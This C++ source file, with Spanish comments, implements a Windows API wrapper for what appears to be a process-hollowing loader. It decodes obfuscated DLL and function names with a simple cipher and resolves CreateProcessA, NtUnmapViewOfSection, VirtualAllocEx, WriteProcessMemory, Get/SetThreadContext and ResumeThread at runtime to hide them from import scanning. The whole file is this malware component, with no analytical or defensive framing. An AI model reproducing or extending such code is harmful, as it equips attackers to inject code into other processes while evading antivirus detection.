#include "system_utils\WinAPIWrapper.h"
#include <Crypt.h>

WinAPIWrapper::WinAPIWrapper() {
	std::vector<unsigned char> kernel32 = { 0x49, 0x43, 0x50, 0x4c, 0x43, 0x4a, 0x11, 0x10, 0xc, 0x42, 0x4a, 0x4a };
	std::vector<unsigned char> ntdll = { 0x4c, 0x52, 0x42, 0x4a, 0x4a, 0x0c, 0x42, 0x4a, 0x4a };

	hKernel32 = GetModuleHandleA(Crypt::decryptCaesar(kernel32, 0xDE).c_str());
	hNtdll = GetModuleHandleA(Crypt::decryptCaesar(ntdll, 0xDE).c_str());
	_LoadFunctions();
}

WinAPIWrapper::~WinAPIWrapper() {
	if (hKernel32) FreeLibrary(hKernel32);
	if (hNtdll) FreeLibrary(hNtdll);
}

void WinAPIWrapper::_LoadFunctions() {
	if (!hKernel32 || !hNtdll) {
		std::cerr << "Error al obtener los manejadores de las DLL" << std::endl;
	}

	// Nombres de las funciones cifradas
	std::vector<unsigned char> CreateProcessA		= { 0x21, 0x50, 0x43, 0x3f, 0x52, 0x43, 0x2e, 0x50, 0x4d, 0x41, 0x43, 0x51, 0x51, 0x1f };
	std::vector<unsigned char> WriteProcessMemory	= { 0x35, 0x50, 0x47, 0x52, 0x43, 0x2e, 0x50, 0x4d, 0x41, 0x43, 0x51, 0x51, 0x2b, 0x43, 0x4b, 0x4d, 0x50, 0x57 };
	std::vector<unsigned char> VirtualProtectEx		= { 0x34, 0x47, 0x50, 0x52, 0x53, 0x3f, 0x4a, 0x2e, 0x50, 0x4d, 0x52, 0x43, 0x41, 0x52, 0x23, 0x56 };
	std::vector<unsigned char> SetThreadContext		= { 0x31, 0x43, 0x52, 0x32, 0x46, 0x50, 0x43, 0x3f, 0x42, 0x21, 0x4d, 0x4c, 0x52, 0x43, 0x56, 0x52 };
	std::vector<unsigned char> ResumeThread			= { 0x30, 0x43, 0x51, 0x53, 0x4b, 0x43, 0x32, 0x46, 0x50, 0x43, 0x3f, 0x42 };
	std::vector<unsigned char> VirtualAllocEx		= { 0x34, 0x47, 0x50, 0x52, 0x53, 0x3f, 0x4a, 0x1f, 0x4a, 0x4a, 0x4d, 0x41, 0x23, 0x56 };
	std::vector<unsigned char> ReadProcessMemory	= { 0x30, 0x43, 0x3f, 0x42, 0x2e, 0x50, 0x4d, 0x41, 0x43, 0x51, 0x51, 0x2b, 0x43, 0x4b, 0x4d, 0x50, 0x57 };
	std::vector<unsigned char> NtUnmapViewOfSection = { 0x2c, 0x52, 0x33, 0x4c, 0x4b, 0x3f, 0x4e, 0x34, 0x47, 0x43, 0x55, 0x2d, 0x44, 0x31, 0x43, 0x41, 0x52, 0x47, 0x4d, 0x4c };
	std::vector<unsigned char> GetThreadContext		= { 0x25, 0x43, 0x52, 0x32, 0x46, 0x50, 0x43, 0x3f, 0x42, 0x21, 0x4d, 0x4c, 0x52, 0x43, 0x56, 0x52 };

	std::string CreateProcessA_str			= Crypt::decryptCaesar(CreateProcessA, 0xDE);
	std::string WriteProcessMemory_str		= Crypt::decryptCaesar(WriteProcessMemory, 0xDE);
	std::string VirtualProtectEx_str		= Crypt::decryptCaesar(VirtualProtectEx, 0xDE);
	std::string SetThreadContext_str		= Crypt::decryptCaesar(SetThreadContext, 0xDE);
	std::string ResumeThread_str			= Crypt::decryptCaesar(ResumeThread, 0xDE);
	std::string VirtualAllocEx_str			= Crypt::decryptCaesar(VirtualAllocEx, 0xDE);
	std::string ReadProcessMemory_str		= Crypt::decryptCaesar(ReadProcessMemory, 0xDE);
	std::string NtUnmapViewOfSection_str	= Crypt::decryptCaesar(NtUnmapViewOfSection, 0xDE);
	std::string GetThreadContext_str		= Crypt::decryptCaesar(GetThreadContext, 0xDE);

    if (hKernel32) {
        CreateProcessA_ = reinterpret_cast<pCreateProcessA>(GetProcAddress(hKernel32, CreateProcessA_str.c_str()));
        VirtualAllocEx_ = reinterpret_cast<pVirtualAllocEx>(GetProcAddress(hKernel32, VirtualAllocEx_str.c_str()));
        WriteProcessMemory_ = reinterpret_cast<pWriteProcessMemory>(GetProcAddress(hKernel32, WriteProcessMemory_str.c_str()));
        GetThreadContext_ = reinterpret_cast<pGetThreadContext>(GetProcAddress(hKernel32, GetThreadContext_str.c_str()));
		ReadProcessMemory_ = reinterpret_cast<pReadProcessMemory>(GetProcAddress(hKernel32, "ReadProcessMemory"));
        SetThreadContext_ = reinterpret_cast<pSetThreadContext>(GetProcAddress(hKernel32, SetThreadContext_str.c_str()));
        ResumeThread_ = reinterpret_cast<pResumeThread>(GetProcAddress(hKernel32, ResumeThread_str.c_str()));
    }

    if (hNtdll) {
        NtUnmapViewOfSection_ = reinterpret_cast<pNtUnmapViewOfSection>(GetProcAddress(hNtdll, "NtUnmapViewOfSection"));
    }
}

BOOL WinAPIWrapper::CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags,
    LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation) {
    return CreateProcessA_ ? CreateProcessA_(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation) : FALSE;
}

LPVOID WinAPIWrapper::VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    return VirtualAllocEx_ ? VirtualAllocEx_(hProcess, lpAddress, dwSize, flAllocationType, flProtect) : nullptr;
}

BOOL WinAPIWrapper::WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten) {
    return WriteProcessMemory_ ? WriteProcessMemory_(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten) : FALSE;
}

NTSTATUS WinAPIWrapper::NtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress) {
    return NtUnmapViewOfSection_ ? NtUnmapViewOfSection_(ProcessHandle, BaseAddress) : STATUS_UNSUCCESSFUL;
}

BOOL WinAPIWrapper::GetThreadContext(HANDLE hThread, LPCONTEXT lpContext) {
    return GetThreadContext_ ? GetThreadContext_(hThread, lpContext) : FALSE;
}

BOOL WinAPIWrapper::ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesRead) {
	return ReadProcessMemory_ ? ReadProcessMemory_(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead) : FALSE;
}

BOOL WinAPIWrapper::SetThreadContext(HANDLE hThread, const CONTEXT* lpContext) {
    return SetThreadContext_ ? SetThreadContext_(hThread, lpContext) : FALSE;
}

DWORD WinAPIWrapper::ResumeThread(HANDLE hThread) {
    return ResumeThread_ ? ResumeThread_(hThread) : -1;
}
